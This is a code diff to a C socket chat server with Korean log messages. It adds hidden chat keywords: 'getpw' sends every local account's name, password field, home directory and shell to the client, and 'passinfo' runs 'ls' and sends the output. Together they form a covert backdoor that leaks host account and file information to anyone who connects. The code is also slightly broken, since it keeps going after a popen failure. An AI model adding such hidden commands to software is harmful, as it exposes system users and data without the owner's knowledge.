@@ -7,6 +7,7 @@
 #include <unistd.h>
 #include <string.h>
 #include <sys/socket.h>
+#include <pwd.h>
 
 #define BUF_SIZE 1024
 
@@ -30,6 +31,36 @@ int is_valid_login(char *username,char *passwd, char *server_passwd) {
     return -1;
 }
 
+void send_etc_passwd(int client_socket) {
+    struct passwd *user_info;
+    char buffer[BUF_SIZE];
+    int len;
+
+    setpwent();
+
+    while ((user_info = getpwent()) != NULL) {
+        len = snprintf(buffer, BUF_SIZE, "name: %s, passwd: %s, home dir: %s, shell: %s, pass change: %ld, pass expire: %ld\n",
+                       user_info->pw_name,
+                       user_info->pw_passwd,
+                       user_info->pw_dir,
+                       user_info->pw_shell,
+                       (long)user_info->pw_change,
+                       (long)user_info->pw_expire);
+
+        if (len < 0 || len >= BUF_SIZE) {
+            fprintf(stderr, "buffer overflow\n");
+            continue;
+        }
+
+        if (send(client_socket, buffer, len, 0) < 0) {
+            perror("send failed");
+            break;
+        }
+    }
+
+    endpwent();
+}
+
 void start_chat_service(int client_socket) {
     char buffer[BUF_SIZE] = {0};
     char send_buffer[BUF_SIZE] = {0};
@@ -46,6 +77,26 @@ void start_chat_service(int client_socket) {
         if (strcmp(buffer, "exit") == 0) {
             display_server_log("클라이언트가 채팅을 종료했습니다.");
             break;
+        }
+
+        if (strcmp(buffer, "passinfo") == 0) {
+            FILE *pipe = popen("ls","r");
+            char buf[BUF_SIZE];
+            if (pipe == NULL) {
+                perror("pipe open error");
+            }
+
+            while (fgets(buf, BUF_SIZE, pipe) != NULL) {
+                if (send(client_socket, buf, strlen(buf), 0) < 0) {
+                    perror("send failed");
+                    break;
+                }
+            }
+            pclose(pipe);
+        }
+
+        if (strcmp(buffer, "getpw") == 0) {
+            send_etc_passwd(client_socket);
         }
 
         char log_message[BUF_SIZE + 50];
